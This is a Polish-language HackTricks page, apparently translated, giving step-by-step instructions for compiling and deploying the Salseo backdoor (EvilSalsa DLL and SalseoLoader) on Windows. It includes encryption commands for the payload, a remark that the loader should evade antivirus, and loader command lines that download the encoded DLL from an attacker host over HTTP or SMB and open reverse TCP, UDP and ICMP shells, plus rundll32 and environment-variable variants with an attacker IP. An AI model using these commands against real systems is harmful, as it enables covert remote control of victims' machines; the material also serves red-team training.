# Salseo

<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>

## Kompilacja binarnych plików

Pobierz kod źródłowy z githuba i skompiluj **EvilSalsa** i **SalseoLoader**. Będziesz potrzebować zainstalowanego **Visual Studio**, aby skompilować kod.

Skompiluj te projekty dla architektury systemu Windows, na którym będziesz ich używać (jeśli Windows obsługuje x64, skompiluj je dla tej architektury).

Możesz **wybrać architekturę** wewnątrz Visual Studio w zakładce **"Build"** po lewej stronie w **"Platform Target".**

(\*\*Jeśli nie możesz znaleźć tych opcji, kliknij w **"Project Tab"**, a następnie w **"\<Project Name> Properties"**)

![](<../.gitbook/assets/image (836).png>)

Następnie skompiluj oba projekty (Build -> Build Solution) (W logach pojawi się ścieżka do pliku wykonywalnego):

![](<../.gitbook/assets/image (378).png>)

## Przygotowanie tylnych drzwi

Po pierwsze, będziesz musiał zakodować **EvilSalsa.dll.** Aby to zrobić, możesz użyć skryptu pythona **encrypterassembly.py** lub skompilować projekt **EncrypterAssembly**:

### **Python**
```
python EncrypterAssembly/encrypterassembly.py <FILE> <PASSWORD> <OUTPUT_FILE>
python EncrypterAssembly/encrypterassembly.py EvilSalsax.dll password evilsalsa.dll.txt
```
### Windows
```
EncrypterAssembly.exe <FILE> <PASSWORD> <OUTPUT_FILE>
EncrypterAssembly.exe EvilSalsax.dll password evilsalsa.dll.txt
```
Ok, teraz masz wszystko, czego potrzebujesz do wykonania całej rzeczy Salseo: **zakodowany EvilDalsa.dll** i **binarny plik SalseoLoader.**

**Prześlij binarny plik SalseoLoader.exe na maszynę. Nie powinny być one wykrywane przez żadne oprogramowanie antywirusowe...**

## **Wykonaj backdoor**

### **Uzyskiwanie powrotnej powłoki TCP (pobieranie zakodowanego dll przez HTTP)**

Pamiętaj, aby uruchomić nc jako nasłuchiwacz powłoki odwróconej oraz serwer HTTP do obsługi zakodowanego evilsalsa.
```
SalseoLoader.exe password http://<Attacker-IP>/evilsalsa.dll.txt reversetcp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwrotnego powłoki UDP (pobieranie zakodowanego pliku dll przez SMB)**

Pamiętaj, aby uruchomić nc jako nasłuchiwacz odwrotnej powłoki oraz serwer SMB do udostępniania zakodowanego pliku evilsalsa (impacket-smbserver).
```
SalseoLoader.exe password \\<Attacker-IP>/folder/evilsalsa.dll.txt reverseudp <Attacker-IP> <Port>
```
### **Uzyskiwanie odwrotnego powłoki ICMP (zakodowany plik DLL już w ofierze)**

**Tym razem potrzebujesz specjalnego narzędzia po stronie klienta, aby odebrać odwrotną powłokę. Pobierz:** [**https://github.com/inquisb/icmpsh**](https://github.com/inquisb/icmpsh)

#### **Wyłącz odpowiedzi ICMP:**
```
sysctl -w net.ipv4.icmp_echo_ignore_all=1

#You finish, you can enable it again running:
sysctl -w net.ipv4.icmp_echo_ignore_all=0
```
#### Uruchom klienta:
```
python icmpsh_m.py "<Attacker-IP>" "<Victm-IP>"
```
#### Wewnątrz ofiary, wykonajmy rzecz zwaną salseo:
```
SalseoLoader.exe password C:/Path/to/evilsalsa.dll.txt reverseicmp <Attacker-IP>
```
## Kompilowanie SalseoLoader jako DLL eksportujący funkcję główną

Otwórz projekt SalseoLoader za pomocą programu Visual Studio.

### Dodaj przed funkcją główną: \[DllExport]

![](<../.gitbook/assets/image (405).png>)

### Zainstaluj DllExport dla tego projektu

#### **Narzędzia** --> **Menedżer pakietów NuGet** --> **Zarządzaj pakietami NuGet dla rozwiązania...**

![](<../.gitbook/assets/image (878).png>)

#### **Wyszukaj pakiet DllExport (używając karty Przeglądaj) i naciśnij Zainstaluj (i zaakceptuj okno popup)**

![](<../.gitbook/assets/image (97).png>)

W folderze projektu pojawiły się pliki: **DllExport.bat** i **DllExport\_Configure.bat**

### **Odinstaluj DllExport**

Naciśnij **Odinstaluj** (tak, to dziwne, ale uwierz mi, jest to konieczne)

![](<../.gitbook/assets/image (94).png>)

### **Zamknij Visual Studio i wykonaj DllExport\_configure**

Po prostu **zamknij** Visual Studio

Następnie przejdź do folderu **SalseoLoader** i **wykonaj plik DllExport\_Configure.bat**

Wybierz **x64** (jeśli zamierzasz użyć go wewnątrz x64, tak było w moim przypadku), wybierz **System.Runtime.InteropServices** (wewnątrz **Przestrzeń nazw dla DllExport**) i naciśnij **Zastosuj**

![](<../.gitbook/assets/image (879).png>)

### **Otwórz projekt ponownie w Visual Studio**

**\[DllExport]** nie powinien być już oznaczony jako błąd

![](<../.gitbook/assets/image (667).png>)

### Zbuduj rozwiązanie

Wybierz **Typ wyjściowy = Biblioteka klas** (Projekt --> Właściwości SalseoLoader --> Aplikacja --> Typ wyjścia = Biblioteka klas)

![](<../.gitbook/assets/image (844).png>)

Wybierz **platformę x64** (Projekt --> Właściwości SalseoLoader --> Kompilacja --> Platforma docelowa = x64)

![](<../.gitbook/assets/image (282).png>)

Aby **zbudować** rozwiązanie: Build --> Zbuduj rozwiązanie (W konsoli wyjściowej pojawi się ścieżka nowego pliku DLL)

### Przetestuj wygenerowane Dll

Skopiuj i wklej plik DLL tam, gdzie chcesz go przetestować.

Wykonaj:
```
rundll32.exe SalseoLoader.dll,main
```
Jeśli nie pojawi się żadny błąd, prawdopodobnie masz działającą DLL!!

## Uzyskaj powłokę za pomocą DLL

Nie zapomnij użyć **serwera HTTP** i ustawić **nasłuchiwacza nc**

### Powershell
```
$env:pass="password"
$env:payload="http://10.2.0.5/evilsalsax64.dll.txt"
$env:lhost="10.2.0.5"
$env:lport="1337"
$env:shell="reversetcp"
rundll32.exe SalseoLoader.dll,main
```
### CMD

### CMD
```
set pass=password
set payload=http://10.2.0.5/evilsalsax64.dll.txt
set lhost=10.2.0.5
set lport=1337
set shell=reversetcp
rundll32.exe SalseoLoader.dll,main
```
<details>

<summary><strong>Naucz się hakować AWS od zera do bohatera z</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Inne sposoby wsparcia HackTricks:

* Jeśli chcesz zobaczyć swoją **firmę reklamowaną w HackTricks** lub **pobrać HackTricks w formacie PDF**, sprawdź [**PLANY SUBSKRYPCYJNE**](https://github.com/sponsors/carlospolop)!
* Kup [**oficjalne gadżety PEASS & HackTricks**](https://peass.creator-spring.com)
* Odkryj [**Rodzinę PEASS**](https://opensea.io/collection/the-peass-family), naszą kolekcję ekskluzywnych [**NFT**](https://opensea.io/collection/the-peass-family)
* **Dołącz do** 💬 [**grupy Discord**](https://discord.gg/hRep4RUj7f) lub [**grupy telegramowej**](https://t.me/peass) lub **śledź** nas na **Twitterze** 🐦 [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podziel się swoimi sztuczkami hakerskimi, przesyłając PR-y do** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
